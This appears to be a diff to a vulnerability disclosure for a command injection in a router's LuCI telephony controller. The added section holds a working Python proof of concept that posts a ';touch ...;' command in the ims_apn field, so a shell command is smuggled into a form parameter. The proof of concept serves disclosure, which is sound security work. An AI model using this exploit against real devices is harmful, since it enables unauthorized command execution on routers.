@@ -7,3 +7,30 @@ In /usr/lib/lua/luci/controller/admin/telephony.lua, the function ```action_ims_
 which leads to a command injection vulnerability. 
 
 ![image](../image/action_ims_on_with_apn-1.png)
+![image](../image/action_ims_on_with_apn-2.png)
+
+The potentially attacking vector is as follows:  
+```
+import requests
+import urllib.parse
+
+TARGET_URL = "http://192.168.1.1/cgi-bin/luci/admin/telephony/trigger_set_ims_on_with_apn"
+COOKIES = {"sysauth": "session_id"}
+
+cmd = ";touch /tmp/CLTaint_VULN_PROVED;"
+encoded_cmd = urllib.parse.quote(cmd)
+
+data = {
+    "ims_cfg_on": "1",
+    "ims_apn": cmd 
+}
+
+try:
+    response = requests.post(TARGET_URL, data=data, cookies=COOKIES, timeout=10)
+    if response.status_code == 200:
+        print("[+] Attack successfully")
+    else:
+        print(f"[-] Attack failed")
+except Exception as e:
+    print(f"[-] Error: {e}")
+```
